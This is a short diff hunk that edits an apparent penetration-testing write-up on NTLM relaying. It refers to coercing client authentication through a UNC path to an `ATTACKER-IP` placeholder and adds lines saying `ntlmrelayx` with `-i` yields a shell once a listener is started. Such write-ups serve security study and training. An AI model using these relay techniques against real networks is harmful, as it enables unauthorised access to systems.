@@ -21,4 +21,9 @@ We still need client interaction and as usual we can do that with `\\ATTACKER-IP
 
 ![](https://i.imgur.com/7V1Ux4X.png)
 
-We can also get a 
+We can also get a reverse shell with `ntlmrelayx` by adding the `-i` option to our command
+
+![](https://i.imgur.com/aZt0dcQ.png)
+
+We can then start up our listener and our shell would look like this 
+
